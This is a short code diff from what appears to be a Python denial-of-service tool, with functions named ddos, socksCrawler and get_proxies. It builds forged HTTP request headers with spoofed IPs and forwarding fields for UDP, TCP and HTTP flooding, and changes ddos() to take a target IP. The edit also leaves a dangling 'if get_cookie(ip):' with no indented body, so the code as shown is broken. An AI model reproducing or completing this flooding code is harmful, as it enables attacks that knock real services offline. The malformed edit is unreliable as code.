@@ -2477,7 +2477,6 @@ def get_proxies():
     
 
 def Headerss(method):
-    if get_cookie(ip):
     header = "UDP"
     if method == "UDP" or method == "TCP" or method == "HTTP":
         get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
@@ -2504,7 +2503,8 @@ def Headerss(method):
         request = post_host + post_again + get_host + socks + forward + connection + mozila + forwards + header + useragent + accept + length + randomip + referer + content + "\r\n"
     return header
 
-def ddos():
+def ddos(ip):
+    if get_cookie(ip):
     socksCrawler()
     socksCrawlz()
     session = requests.Session()
